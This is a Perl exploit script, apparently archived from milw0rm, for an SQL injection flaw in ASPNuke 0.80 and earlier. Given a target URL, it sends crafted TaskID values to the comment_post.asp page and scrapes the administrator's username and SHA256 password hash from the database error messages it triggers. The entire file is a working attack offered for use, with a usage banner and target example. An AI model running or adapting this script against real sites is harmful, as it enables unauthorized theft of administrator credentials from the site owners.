#!/usr/bin/perl -w
#
# SQL Injection Exploit for ASPNuke <= 0.80
# This exploit retrieve the username of the administrator of the board and his password crypted in SHA256
# Related advisory: http://www.securityfocus.com/archive/1/403479/30/0/threaded
# Discovered and Coded by Alberto Trivero

use LWP::Simple;

print "\n\t===============================\n";
print "\t= Exploit for ASPNuke <= 0.80 =\n";
print "\t=     by Alberto Trivero      =\n";
print "\t===============================\n\n";

if(@ARGV!=1 or !($ARGV[0]=~m/http/)) {
   print "Usage:\nperl $0 [full_target_path]\n\nExamples:\nperl $0 http://www.example.com/aspnuke/\n";
   exit(0);
}

$page=get($ARGV[0]."module/support/task/comment_post.asp?TaskID=Username") || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page=~m/the varchar value '(.*?)' to a column/ && print "[+] Username of admin is: $1\n";
print "[-] Unable to retrieve Username\n" if(!$1);
$page=get($ARGV[0]."module/support/task/comment_post.asp?TaskID=Password") || die "[-] Unable to retrieve: $!";
$page=~m/the varchar value '(.*?)' to a column/ && print "[+] SHA256 hash of password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);

# milw0rm.com [2005-06-27]